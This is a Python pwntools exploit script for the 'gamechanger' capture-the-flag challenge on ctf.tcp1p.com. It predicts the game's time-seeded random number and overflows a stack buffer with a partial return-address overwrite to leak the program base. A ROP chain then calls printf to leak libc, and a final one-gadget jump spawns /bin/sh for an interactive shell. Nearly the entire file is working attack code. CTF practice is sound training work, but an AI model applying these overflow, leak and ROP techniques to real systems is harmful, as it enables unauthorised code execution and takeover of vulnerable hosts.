#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys
import time
from ctypes import CDLL

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/gamechanger" # patched the libc with libc6_2.35-0ubuntu1_amd64.so
TARGET = DIR + EXECUTABLE 
HOST, PORT = "ctf.tcp1p.com", 9254
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
	arch=["i386", "amd64", "aarch64"][1],
	endian="little",
	os="linux",
	log_level = ['debug', 'info', 'warn'][2],
	terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def win_game():
	cdll.srand(int(time.time()))
	correct_answer = (cdll.rand() + 34) % 23
	io.sendlineafter(b"100\n", str(correct_answer).encode())
	sleep(0.01)

def exploit(io, libc=null, cdll=null):
	if LOCAL==True:
		#raw_input("Fire GDB!")
		if len(sys.argv) > 1 and sys.argv[1] == "d":
			choosen_gdb = [
				"source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
				"source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
				"source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
				][0]
			cmd = choosen_gdb + """
			b *ask+0x66
			c
			"""
			gdb.attach(io, gdbscript=cmd)
	io.sendlineafter(b" game? (1: Yes, 0: No):", b"1", timeout=2)
	win_game()

	# === Overflow jump to main+1
	p = b""
	p = b"A"*(0x108-1)+b"|"
	p += p16(0xe3e2+1) # ?3e2+1 == ? unknown 
	io.sendafter(b"What do you want to do this morning?\n", p, timeout=2)
	sleep(0.01)
	io.recvuntil(b"|")
	LEAKED_ELF = u64(io.recv(6, timeout=2).ljust(8, b"\x00"))
	elf.address = LEAKED_ELF - elf.symbols["main"] - 1
	print("LEAKED_ELF               :", hex(LEAKED_ELF))
	print("elf.address              :", hex(elf.address))

	io.recvuntil(b"game? ", timeout=2)
	io.sendlineafter(b"(1: Yes, 0: No):", b"1")
	sleep(0.01)
	win_game()

    # === Leak LIBC Address using printf($RDI)
    # === and jump back to the ask() function
	p = b""
	p = b"A"*(0x108-1)+b"|"
	p += p64(elf.search(asm('ret')).__next__())
	p += p64(elf.symbols["printf"])
	p += p64(elf.symbols["ask"]+1)
	io.sendafter(b"What do you want to do this morning?\n", p)
	sleep(0.01)
	io.recvuntil(b"|")
	io.recvuntil(b"person!\n", timeout=2)
	

	LEAKED_LIBC = u64(io.recv(6).ljust(8, b"\x00"))
	libc.address = LEAKED_LIBC - libc.symbols["funlockfile"]
	print("LEAKED_LIBC              :", hex(LEAKED_LIBC))
	print("libc.address             :", hex(libc.address))

	"""
	0xefcf5 execve("/bin/sh", r10, rdx)
	constraints:
	address rbp-0x78 is writable
	[r10] == NULL || r10 == NULL
	[rdx] == NULL || rdx == NULL
	"""

	p = b""
	p = p.ljust(0x108-8, b"A")
	p += p64(elf.bss(0x200)) # writeable memory area
	p += p64(libc.address+0xefcf5) # jump to One gadget
	io.sendafter(b"What do you want to do this morning?\n", p)
	sleep(0.01)

	io.interactive()

if __name__ == "__main__":
	io, libc = null, null
	if args.REMOTE:
		REMOTE = True
	else:
		LOCAL = True
	libc = ELF("libc6_2.35-0ubuntu1_amd64.so")
	cdll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

	while True:
		try:
			if REMOTE == True:
				io = remote(HOST, PORT)
				
			else:
				io = process(
					[TARGET, ],
					env={
					#     "LD_PRELOAD":DIR+"/___",
					#     "LD_LIBRARY_PATH":DIR+"/___",
					},
				)
			elf.address = 0
			exploit(io, libc, cdll)
		except Exception as e:
			print(e)
			pass